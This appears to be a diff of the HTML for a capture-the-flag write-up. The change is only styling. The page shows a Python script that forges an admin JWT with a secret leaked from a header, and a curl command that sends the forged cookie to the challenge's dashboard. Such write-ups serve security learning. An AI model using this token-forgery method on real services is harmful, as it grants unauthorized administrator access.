@@ -436,7 +436,7 @@ Concept We were given a trading platform website where we had to login as admin 
 <h1 id="solve">Solve</h1>
 <p>On logging in as user, I inspected the cookies and noticing that we have a jwt token for the current user. I wrote a python script to
 manipulate the user token into an admin token.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># The secret from the &#39;jwt&#39; header</span>
@@ -453,8 +453,8 @@ manipulate the user token into an admin token.</p>
 </span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, secret, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)
 </span></span><span style="display:flex;"><span>print(token)
 </span></span></code></pre></div><p>After I used curl to send the token</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -H <span style="color:#e6db74">&#34;Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTc2MTIyODA5NSwiZXhwIjoxNzYxMjM1Mjk1fQ.ZJUOMnUgQvYVZGB-X8ucKsq86Vf8U4KOTbCUPZ5QiTE&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  https://host5.metaproblems.com:7606/dashboard
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -H <span style="color:#e6db74">&#34;Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTc2MTIyODA5NSwiZXhwIjoxNzYxMjM1Mjk1fQ.ZJUOMnUgQvYVZGB-X8ucKsq86Vf8U4KOTbCUPZ5QiTE&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  https://host5.metaproblems.com:7606/dashboard
 </span></span></code></pre></div><p>Another method was to replace the jwt token in the browser and get the flag.</p>
 
       </div>
